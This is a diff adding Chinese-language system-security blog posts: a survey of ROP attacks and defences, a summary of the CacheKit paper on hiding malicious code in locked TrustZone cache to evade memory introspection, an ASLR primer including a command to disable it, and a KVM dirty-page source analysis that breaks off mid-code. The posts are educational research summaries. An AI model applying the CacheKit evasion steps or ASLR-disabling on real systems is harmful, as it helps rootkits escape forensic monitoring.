@@ -100,6 +100,933 @@
 
 
 
+    
+      <article id="post-rop-attack-defense" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/22/rop-attack-defense/">ROP攻与防</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/08/22/rop-attack-defense/" class="article-date">
+  <time datetime="2017-08-22T11:55:10.000Z" itemprop="datePublished">2017-08-22</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/系统安全/">系统安全</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="http://weibo.com/diting0x" target="_blank" rel="external">diting0x</a></p>
+<p>ROP是一种代码复用攻击方式(Code Reuse Attack)。 ROP攻击劫持控制流后，复用内存中可执行的指令(gadget)，这些gadgets以ret指令返回，攻击者利用这些gadgets以不同方式拼接并执行，完成攻击过程。</p>
+<p>下面以几个图来展示ROP攻击(图来源于Blackhat 2013 Kevin Z.Snow, Luca Davi)</p>
+<p>metaphor： </p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/rop1.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/rop1.jpeg" width="400"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>攻击过程：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/rop2.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/rop2.jpeg" width="400"></a><br>    <figcaption></figcaption><br></figure>
+
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/rop3.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/rop3.jpeg" width="400"></a><br>    <figcaption></figcaption><br></figure>
+
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/rop4.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/rop4.jpeg" width="400"></a><br>    <figcaption></figcaption><br></figure>
+
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/rop5.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/rop5.jpeg" width="400"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>代码复用攻击历史：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/ROP6.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/ROP6.jpeg" width="400"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p>再次声明，以上六张图全部来源于(Blackhat 2013 Kevin Z.Snow, Luca Davi)</p>
+<p>上图可以大致了解2010年前ROP的发展历程，而下文大多数介绍的是近三五年ROP的攻与防。</p>
+<p>Ret2libc可以说是ROP的前身，有点接近ROP。其主要是复用libc的函数地址(而不是含有shellcode代码的栈地址)覆盖被利用栈的返回地址。如果攻击者想触发一个shell, 他会利用system()地址来覆盖返回地址并设置好system()在栈中需要的必要参数，以便能成功调用system()。</p>
+<p>随着ASLR的出现，将程序的数据段、堆、栈以及共享库在内存中的位置随机化，使得Ret2libc和ROP变得更加困难。<br>道高一尺魔高一丈，一攻一防，近些年对ROP的研究越来越热，不断有研究者设计更高级的ROP来绕过系统中现有的防御机制(包括DEP,ASLR),又不断有研究者设计更安全的ASLR或其它安全机制来抵御ROP。</p>
+<p>攻：JIT-ROP(IEEE S&amp;P 2013)，其主要思想是即时扫描有效内存，即时反汇编搜寻rop gadgets。具体过程是，利用内存泄漏(memory disclousure)获取一个运行时的代码指针，泄漏当前4K的内存页，再利用页中指向其它页的分支获取更多的页面。之后将当前页反汇编获取所需的gadgets，构造ROP链。</p>
+<p><a href="https://media.blackhat.com/us-13/US-13-Snow-Just-In-Time-Code-Reuse-Slides.pdf" target="_blank" rel="external">slides</a> </p>
+<p>防：ROPecker (NDSS 2014)</p>
+<p>ROPecker是一个利用Intel LBR特性记录代码执行流来检测和防御ROP的工具，是第一个可以针对所有形式ROP攻击的一种general的，不需要源代码，二进制代码重写。</p>
+<p>ROPecker分析了现有ROP攻击的特点,发现ROP的gadgets一般利用jmp与分支判断指令跳转，在代码段中会进行大幅度的跳转，且其调用链很长。基于这两个特点，ROPecker先对要检测的程序进行离线gadgets分析，利用LBR记录代码执行流的分析信息，将不在代码当前执行片段周围的代码（sliding window）设置为不可执行状态，执行sliding window以外的代码就会触发ROPecker对攻击的分析。基于离线gadgets分析，再加上LBR的分析信息（当前程序的过去和未来的执行情况），一旦发现程序的执行流不符则认为程序受到了ROP攻击，则强制终止程序。以上检测和防御机制假设DEP已经打开。<br><a href="http://ink.library.smu.edu.sg/cgi/viewcontent.cgi?article=2972&amp;context=sis_research" target="_blank" rel="external">pdf</a></p>
+<p>防：Kbouncer（Security’13） 也是利用LBR记录程序的执行分支信息，识别程序的控制流转移信息，在关键点监控程序的间接指令来检测并防御ROP，其在Windows 7中实现。Kbouncer基于两个发现，1) ROP攻击会返回到non-call-preceded地址，其相对应的防御机制是Call-Preceded原则，没有恶意的代码指令执行的时候，ret指令回到的地址的上一条指令一定是call；2)ROP是由许多短gadgets组成的长链序列，其相对应的防御机制是不允许许多短gadgets组成的长链序列<br><a href="http://www.csd.uoc.gr/~hy457/reports/kbouncer-slides.pdf" target="_blank" rel="external">slides</a></p>
+<p>攻： ROP is Still Dangerous:<br>Breaking Modern Defenses  (Security’14 -Berkeley)<br>Abstract: 提出三种方法(Call-Preceded ROP, Evasion Attacks, History Flushing)攻破现有的ROP防御方法，包括kbouncer,ROPecker。<br>并对未来防御ROP的方式提出两点要求：1)将代码分类成gadgets与non-gadgets并非易事；2)防御机制需要集中关注正常执行与ROP攻击的基本不同点。</p>
+<p><a href="https://www.usenix.org/sites/default/files/conference/protected-files/sec14_slides_carlini.pdf" target="_blank" rel="external">slides</a><br><a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-carlini.pdf" target="_blank" rel="external">pdf</a> <a href="https://www.usenix.org/node/184508" target="_blank" rel="external">video</a></p>
+<p>防：ASLR-Guard（ccs’15 Byoungyoung）<br>要实施code reuse attack，要满足两个条件：1.知道现有gadgets的地址，2.用这个地址覆盖被控制的数据。对2的防御有：stackguard,cfi,code pointer integrity，对1的防御有：ASLR,但是ASLR有个缺陷，信息泄露，比如代码指针的泄露导致可验获取代码地址（JIT-ROP,Blind ROP, “Missing the point”)<br>本文目标：阻止代码指针的泄露。方法：系统化的发现代码指针，两种技术来阻止代码指针的泄露，隔离与加密。将代码指针存储在隔离的内存区域，隔离还不够，还需进行加密。实现：gcc,gas,ld,ld.so 3000sloc，eglibc,glibc。<br><a href="https://lifeasageek.github.io/papers/lu:aslrguard-slides.pdf" target="_blank" rel="external">slides</a> <a href="https://lifeasageek.github.io/papers/lu:aslrguard.pdf" target="_blank" rel="external">pdf</a></p>
+<p>防：XnR  (CCS’15)<br>里面关于rop,aslr,jit-rop等介绍的很详细<br>该文从代码泄漏的角度进行了防护：当代码在被执行期间，不允许对代码的读操作，从而能有效抵御JIT code reuse攻击，简称XnR。类似W^X（W⨁X)策略。 这一思路在无硬件支撑的条件下，通过软件MMU实现，<br>基本思路：要实现XnR策略，在硬件不支持的情况下，可通过修改MMU中处理过程，实现软体MMU。 目前架构中：mmu可以检测到写，但是无法检测到读；读只能通过内存页的non-present实现；但是一旦non-present的话，代码也将无法运行。解决方法：修改page fault handler,在handler中区分page fault产生的原因，并决定是否继续正常执行，还是发现代码内存读取行为，中止执行。 具体的，在代码运行期间，仅允许极少的代码可读，文中的实验数据表明，采用3页的sliding windows是一个比较好的选择，即当前代码页面的相邻两页。是否可读性的实现方式是通过设置页面的present位实现，非法的读取将陷入中断，在中断中判断中断原因是缺页还是非法读。<br><a href="https://www.infsec.cs.uni-saarland.de/wp-content/uploads/sites/2/2014/10/nuernberger2014ccs_disclosure.pdf" target="_blank" rel="external">PDF</a> <a href="http://happyhacking.info/post/xnr" target="_blank" rel="external">来自liangyu blog</a></p>
+<p>防：No-Execute-After-Read:<br>Preventing Code Disclosure in Commodity Software （AsiaCCS’16）<br>文章提出最新的XnR技术不能防御just-in-time的代码复用攻击，并设计了一种No-Execute-After-Read(NEAR)，针对just-it-time攻击进行强安全保证。NEAR允许所有代码被披露，但是阻止被披露的代码继续执行。<br><a href="https://www3.cs.stonybrook.edu/~mikepo/papers/near.asiaccs16.pdf" target="_blank" rel="external">pdf</a> </p>
+<hr>
+<p>待续</p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/">ROP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-cachekit" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/19/cachekit/">CacheKit 利用cache不一致性绕过内存监控</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/08/19/cachekit/" class="article-date">
+  <time datetime="2017-08-19T07:30:36.000Z" itemprop="datePublished">2017-08-19</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Notes/">Notes</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="http://weibo.com/diting0x" target="_blank" rel="external">diting0x</a></p>
+<p>听了Prof Kun Sun的报告，略作总结。</p>
+<p>CacheKit核心思想：利用Trustzone的cahce不一致性，将恶意代码加载一块系统预留的I/O空间重定向的cache中，绕过安全世界和正常世界的监控。</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/cachekit2" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/cachekit2" width="400"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<hr>
+<h3 id="几个发现"><a href="#几个发现" class="headerlink" title="几个发现"></a>几个发现</h3><ul>
+<li>1),安全世界可以访问正常世界的内存、CPU寄存器，反之则不行。但是，安全世界无法访问正常世界的cache内容</li>
+<li>2),内存空间：0x80000000-0xFFFFFFFF<br> I/O空间： 0x0 -0x7FFFFFFF，其中0x1300000-0x1500000属于系统预留</li>
+<li>3),NS(non-secure)位，置零则表示在安全世界的cache，否则表示正常世界的cache。</li>
+<li>4), cache flush: 在安全世界中，不管cache lind的NS位是什么，会flush所有的cache line；而在正常世界中，只会fulsh正常世界的cache, NS=1.</li>
+<li>5),cache不一致性：同一块物理地址可以在安全世界和正常世界对应不同的cache line。</li>
+<li>6),有两种获取系统物理内存的方法，一是从处理器中获取，二是利用DMA从外设中获取；而DMA获取的方法直接获取物理内存而不会获取处理器中的cache内容</li>
+</ul>
+<hr>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>1）将恶意代码加载到正常世界的cache中，但不加载到RAM中；</p>
+<p>2）利用ARM cache locking机制保证恶意代码能持续存在cache中，而不会被换出 ；</p>
+<p>3）控制物理地址空间保证恶意代码的隐蔽性。</p>
+<p>如何做到上述的利用过程？</p>
+<hr>
+<h3 id="三个挑战"><a href="#三个挑战" class="headerlink" title="三个挑战"></a>三个挑战</h3><p>1) cache加载：在DRAM初始化前，允许让BLOS代码将栈存储在cache中(cache-as-ram CAR系统)。cacheKit利用CAR将恶意代码存储在cache中。</p>
+<p>处理器cache的设计是为了对系统软件透明，所以ARM架构不支持在正常操作过程中直接访问cache lines，要让处理器读写cache中的内容，必须让处理器读写虚拟内存。<br>可以分两步进行，第一步是要让内存能够进行caching，具体细节可以参考论文4.2.1；<br>第二步是要让代码中的所有比特填充cache，但要避免将加载cache本身的程序代码也放进cache。</p>
+<p>2）cache locking: 硬件支持将cache 锁住，ARMv7允许系统软件锁住八组cache中的七组。</p>
+<p>3) cache 隐藏: 保证cachekit绕过安全世界和正常世界的监控；</p>
+<ul>
+<li><p>绕过正常世界监控：在正常世界中，当获取物理内存工具(如LiME)从处理器中读取物理内存时，获取的过程也会显示cache中的值。解决方法是利用未使用的系统I/O地址区域的cache,而取证者不会扫描这块区域，就算取证者打算扫描这块区域，也很难辨认哪个地址是安全可读的，哪些要跳过的，一不小心读到特定的硬件控制位就会导致系统停机与崩溃</p>
+</li>
+<li><p>绕过安全世界监控：发现1）2）5）。安全世界无法访问正常世界中cache的内容。</p>
+</li>
+</ul>
+<p>cache隐藏细节：直接使用cache locking会带来两个问题；<br>第一个问题就是，直接在正常世界的kernel中做introspection,使用kernel模块将每个内存页面映射到内核地址空间仍然可以读取cache的内容；第二，cache lines被锁住以后，仍然可以clean操作将其内容写入到内存中。要解决这两个问题，就是利用系统预留内存0x1300000-0x1500000.在部署cachekit之前，这块区域是直接被MMU重定向到外设总线的；部署cachekit之后，利用cache-as-ram技术将其这块区域配置为内存空间，对这块区域所有的读写操作都被重定向到处理器的cache中。这块区域不会被任何RAM或者I/O设备所支持，不会有任何物理设备对这块区域响应。</p>
+<hr>
+<h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><p><a href="http://csis.gmu.edu/ksun/publications/CacheKit-eurosp2016.pdf" target="_blank" rel="external">CacheKit: Evading Memory Introspection Using Cache Incoherence</a> - ES&amp;P’2016 Kun Sun</p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Cache/">Cache</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TrustZong/">TrustZong</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-intro-aslr" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/08/intro-aslr/">系统安全浅薄知识系列(一)-ASLR</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/05/08/intro-aslr/" class="article-date">
+  <time datetime="2017-05-08T12:59:01.000Z" itemprop="datePublished">2017-05-08</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/系统安全科普/">系统安全科普</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">@Diting0x</a><br>转载请注明：作者信息以及来源<a href="http://www.csyssec.org/20170508/intro-aslr/" target="_blank" rel="external">《CSysSec:系统安全浅薄知识系列(一)-ASLR》</a></p>
+<hr>
+<p>ASLR全称是Address Space Layout Randomization，翻译成中文就是地址空间布局随机化。</p>
+<p><strong>怎么做？</strong></p>
+<p>随机化程序的关键数据在内存中的位置，这些数据包括程序的数据段、堆、栈以及共享库。见下图：（图来源于CCS’15）</p>
+<figure><br>    <a href="http://7xppf1.com1.z0.glb.clouddn.com/aslr1.png" target="_blank" rel="external"><img src="http://7xppf1.com1.z0.glb.clouddn.com/aslr1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>这些数据为什么没有包括代码段？ 下文会继续讨论。</p>
+<p><strong>干嘛用的？</strong> </p>
+<p>ASLR是一种保护缓冲区溢出攻击的防御技术，通过增加内存攻击(如return-into-libc或ROP)预测目标地址的难度阻碍其实施攻击。见下图：(图来源于CODASPY’16)</p>
+<figure><br>    <a href="http://7xppf1.com1.z0.glb.clouddn.com/aslr2.png" target="_blank" rel="external"><img src="http://7xppf1.com1.z0.glb.clouddn.com/aslr2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>攻击者欲跳转到目标地址0xbfffd5d8的shellcode中，但在执行时其地址被随机化到了0xbfffe3f8中，此时跳转到0xbfffd5d8会导致内存奔溃。</p>
+<p><strong>ASLR历史</strong></p>
+<p>请看下图：（图来源于Abusing Performance Optimization Weaknesses to Bypass ASLR， 2014 BlackHat USA）</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/aslrhistory.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/aslrhistory.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p><strong>如何开启或关闭ASLR?</strong> </p>
+<p>以Linux系统为例，通过配置<code>/proc/sys/kernel/randomize_va_space</code>中的值来开启或关闭ASLR.<br>运行<code>cat /proc/sys/kernel/randomize_va_space</code>命令，若输出为0，表示没有随机化，所有都是静态的；若输出为1，表示保守随机化，共享库、栈、mmap()，VDSO以及堆都被随机化；若输出为2，表示全随机化，在1的基础上，增加了通过brk()方式内存管理的随机化。<br>下图为Ubuntu14.04的结果</p>
+<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/aslr3.png" alt="aslr3"></p>
+<p>关闭ASLR,可以运行<code>echo 0 /proc/sys/kernel/randomize_va_space</code></p>
+<p>Windows和Linux在ASLR机制上有所不同，想了解详情可以参考<a href="http://www.freebuf.com/articles/system/29392.html" target="_blank" rel="external">这里</a></p>
+<p><strong>编译成PIE?</strong></p>
+<p>说到这里，还遗留了一个问题，那就是随机化的数据为什么没有包括代码段？ 要想让ASLR机制有效，就必须保证程序在内存空间的所有区域都是随机化的。有任何一部分没有被随机化，都有可能被攻击者利用来定位有效的gadgets来实施攻击。实际上，ASLR对代码段(.text)是不作随机化的，只有当可执行文件在编译成PIE(Position Independent Executable，位置依赖可执行文件)时，代码段才会被随机化。</p>
+<p>对于non-PIE(也就是没有添加编译选项PIE),尽管ASLR的级别设置为2，攻击者仍然能利用程序的.text段以及GOT/PLT(全局偏移表/过程连接表)实施攻击(比如return-to-got/plt、ROP)。</p>
+<p>既然non-PIE的可执行文件不能享受ASLR机制带来的安全性，那ASLR又有何意义? 是不是可以把所有的程序在编译时都加上PIE选项？ 对Linux系统来说，是有选择性的编译PIE，所有的库文件都是默认编译成PIE的，而大部分程序默认是不会被编译成PIE的。详情可以参考这篇论文的发现<a href="http://e-collection.library.ethz.ch/eserv/eth:5699/eth-5699-01.pdf?pid=eth:5699&amp;dsID=eth-5699-01.pdf" target="_blank" rel="external">Too much PIE is bad for performance</a>。</p>
+<p>说了这么多，PIE的原理是什么？文章提到的这么多专有名词，ROP, Return-to-libc,Return-to-GOT/PIT, gadgets都又是什么呢？有机会再谈。</p>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p>Lu et al,”ASLR-Guard: Stopping Address Space Leakage for Code Reuse Attacks”,CODASPY’16<br>Gu et al, “Derandomizing Kernel Address Space Layout for Memory Introspection and Forensics”, CCS’15<br><a href="http://www.freebuf.com/articles/system/29392.html" target="_blank" rel="external">ASLR在Windows与Linux系统之间的差别</a><br><a href="https://pax.grsecurity.net/docs/aslr.txt" target="_blank" rel="external">PAX/ASLR</a><br><a href="https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/" target="_blank" rel="external">How Effective is ASLR on Linux Systems?</a></p>
+<hr>
+<p>转载请注明：作者信息以及来源<a href="http://www.csyssec.org/20170508/intro-aslr/" target="_blank" rel="external">《CSysSec:系统安全浅薄知识系列(一)-ASLR》</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-kvm-migration" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/04/kvm-migration/">KVM迁移中脏页位图机制源码分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/05/04/kvm-migration/" class="article-date">
+  <time datetime="2017-05-04T07:09:30.000Z" itemprop="datePublished">2017-05-04</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/虚拟机迁移/">虚拟机迁移</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者:<a href="http://blog.csdn.net/mrbuffoon" target="_blank" rel="external">Mr_buffoon</a><br><strong>转载请注明</strong>：原作者信息以及<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec</a></p>
+<hr>
+<p>我们都知道KVM支持在线迁移，而其在线迁移是通过内存预拷贝（迭代拷贝）机制来实现的。预拷贝的一个思想就是不断记录脏页并每一轮迭代拷贝脏页面，直至达到一定的条件就退出迭代，进行最后的停机拷贝。关于预拷贝的原理我之前有博客进行了简单分析，在这里就不重复说明了。那这篇文章主要是就其中的脏页记录机制从源码层面进行分析。</p>
+<p>这里分析的代码版本是kvm3.10.1和qemu 1.5.3。我们直接进入到迁移（migration）的线程函数Migration.c—&gt;migration_thread()，直接看代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">migration_thread</span><span class="params">(<span class="keyword">void</span> *opaque)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="comment">//.........//省略部分代码  </span></div><div class="line">    qemu_savevm_state_begin(s-&gt;file, &amp;s-&gt;params);  </div><div class="line">  </div><div class="line">    <span class="keyword">while</span> (s-&gt;state == MIG_STATE_ACTIVE) &#123;  </div><div class="line">        <span class="keyword">int64_t</span> current_time;  </div><div class="line">        <span class="keyword">uint64_t</span> pending_size;  </div><div class="line">  </div><div class="line">        <span class="keyword">if</span> (!qemu_file_rate_limit(s-&gt;file)) &#123;  </div><div class="line">            DPRINTF(<span class="string">"iterate\n"</span>);  </div><div class="line">            pending_size = qemu_savevm_state_pending(s-&gt;file, max_size);  </div><div class="line">            DPRINTF(<span class="string">"pending size %lu max %lu\n"</span>, pending_size, max_size);  </div><div class="line">            <span class="keyword">if</span> (pending_size &amp;&amp; pending_size &gt;= max_size) &#123;  </div><div class="line">                qemu_savevm_state_iterate(s-&gt;file);  </div><div class="line">            &#125; <span class="keyword">else</span> &#123;  </div><div class="line">                <span class="comment">//..........//省略部分代码  </span></div><div class="line">                qemu_savevm_state_complete(s-&gt;file);  </div><div class="line">                <span class="comment">//..........//省略部分代码  </span></div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">  </div><div class="line">        <span class="comment">//..........//省略部分代码  </span></div><div class="line">          </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="comment">//..........//省略部分代码  </span></div><div class="line">  </div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p> 这个函数主要是完成迁移的初始化以及内存拷贝过程，这里先看一下里面qemu_savevm_state_begin()这个函数，他里面调用了save_live_setup这个函数指针，这个函数指针在之前被注册，指向了ram_save_setup()这个函数，具体的注册过程这里不进行分析，根据代码追一下可以追到的。ram_save_setup()主要是进行一些初始化的工作，下面看ram_save_setup()这个函数：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ram_save_setup</span><span class="params">(QEMUFile *f, <span class="keyword">void</span> *opaque)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    ........  </div><div class="line">  </div><div class="line">    migration_bitmap = bitmap_new(ram_pages);  </div><div class="line">    bitmap_set(migration_bitmap, <span class="number">0</span>, ram_pages);  </div><div class="line">    migration_dirty_pages = ram_pages;  </div><div class="line">  </div><div class="line">    ........  </div><div class="line">  </div><div class="line">    memory_global_dirty_log_start();  </div><div class="line">    migration_bitmap_sync();  </div><div class="line">    ........  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>我们看这个函数，里面有一个migration_bitmap，没错，这就是迁移过程中用到的脏页位图，看其定义可以发现这是一个unsigned long *类型的全局变量，这个函数代码中首先给位图分配了内存空间，然后初始化为全0。memory_global_dirty_log_start()这个函数是开启脏页记录，实际上就是对内存页面进行写保护，这里略过不谈。migration_bitmap_sync()函数是同步脏页位图。那为什么要同步脏页位图呢？到底有多少脏页位图？我们下面来思考一下。</p>
+<p>我们知道脏页就是修改了内存页面，kvm可以认为是qemu和kvm内核两个层次，I/O主要是在qemu层次进行的，那qemu层可能会有大量的内存的修改。那kvm内核有没有页面的修改呢？实际上，kvm内核也可能发生少量的内存的修改。这样，kvm就需要在两个层次都要维持各自的脏页位图，并且要将这两层的位图进行同步。通过分析代码，kvm两个层次我们可以认为维护了三套位图：一是kvm内核维护的脏页位图memslot-&gt;dirty_bitmap，这个位图记录kvm内核中的脏页，kvm内核中所有的对内存页面的修改都会对应着修改这个位图的位；二是qemu层次维护的一个脏页位图ram_list_phys_dirty[]，qemu层次对内存页面的修改都会相应的修改这个位图的位，并且它还会通过系统调用获取内核中的位图，并进行同步修改；三是迁移时具体使用的位图migration_btimap，这也是在qemu层的，但是它是复制ram_list_phys_dirty[]的相应位。</p>
+<p><br><br>我们一项一项分析，先看看migration_bitmap是如何复制ram_list_phys_dirty[]的。这个复制的过程是在migration_bitmap_sync()函数实现的，先看代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">migration_bitmap_sync</span><span class="params">(<span class="keyword">void</span>)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    ........  </div><div class="line">    trace_migration_bitmap_sync_start();  </div><div class="line">    memory_global_sync_dirty_bitmap(get_system_memory());  </div><div class="line">  </div><div class="line">    QTAILQ_FOREACH(block, &amp;ram_list.blocks, next) &#123;  </div><div class="line">        <span class="keyword">for</span> (addr = <span class="number">0</span>; addr &lt; block-&gt;length; addr += TARGET_PAGE_SIZE) &#123;  </div><div class="line">            <span class="keyword">if</span> (memory_region_test_and_clear_dirty(block-&gt;mr,  </div><div class="line">                                                   addr, TARGET_PAGE_SIZE,  </div><div class="line">                                                   DIRTY_MEMORY_MIGRATION)) &#123;  </div><div class="line">                migration_bitmap_set_dirty(block-&gt;mr, addr);  </div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    trace_migration_bitmap_sync_end(migration_dirty_pages  </div><div class="line">                                    - num_dirty_pages_init);  </div><div class="line">    ........  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>我们分析这个函数，里面memory_global_sync_dirty_bitmap()就是将kvm内核中的位图同步到ram_list_phys_dirty[]中，这样就保证了现在ram_list_phys_dirty[]是完整的位图。memory_region_test_and_clear_dirty()是判断ram_list_phys_dirty[]该位是否置位，如果置位则清位，migration_bitmap_set_dirty()这个函数则是将migration_bitmap置位，这两个函数结合，就将ram_list_phys_dirty[]中为1的位复制到了migration_bitmap中。这里引申一点做个说明，迁移时，如果migration_bitmap相应位为1，就将页面保存，并将migration_bitmap位图相应位清位（migration_bitmap_find_and_reset_dirty()函数来实现的），这样就能保证migration_bitmap的准确性和实时性。</p>
+<p>我们再分析一下前面提到的几个函数。memory_global_sync_dirty_bitmap()这里先不分析，后面在分析内核与qemu位图同步时候再分析。先看memory_region_test_and_clear_dirty()这个函数：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">memory_region_test_and_clear_dirty</span><span class="params">(MemoryRegion *mr, hwaddr addr,  </span></span></div><div class="line"><span class="function"><span class="params">                                        hwaddr size, <span class="keyword">unsigned</span> client)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="keyword">bool</span> ret;  </div><div class="line">    assert(mr-&gt;terminates);  </div><div class="line">    ret = cpu_physical_memory_get_dirty(mr-&gt;ram_addr + addr, size,  </div><div class="line">                                        <span 